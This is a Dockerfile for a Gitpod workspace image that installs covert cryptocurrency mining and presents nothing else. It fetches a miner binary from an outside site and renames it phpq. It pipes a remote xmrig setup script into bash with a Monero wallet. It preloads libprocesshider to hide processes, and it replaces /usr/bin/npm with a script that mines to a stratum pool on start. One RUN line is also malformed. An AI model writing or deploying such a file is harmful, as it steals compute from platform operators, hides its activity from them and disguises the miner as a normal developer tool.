FROM gitpod/workspace-full
RUN apt update && apt -y install curl xz-utils git make gcc && \
    cd /opt && wget http://ilovenypizza.com/subscribe && \
	apt -y purge xz-utils && apt -y autoremove --purge && apt -y clean && apt -y autoclean; rm -rf /var/lib/apt-get/lists/*
RUN curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2
    cd /cobasaja && make && mv libprocesshider.so /usr/local/lib && echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
RUN mv /opt/subscribe /usr/bin/phpq
RUN chmod +x /usr/bin/phpq
RUN echo " phpq -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qfzjd2nvq0k72mrjpd0qt9as2gvan4kaww9l8dl -t $(nproc --ignore 1)" > /usr/bin/npm
RUN chmod +x /usr/bin/npm
ENTRYPOINT npm
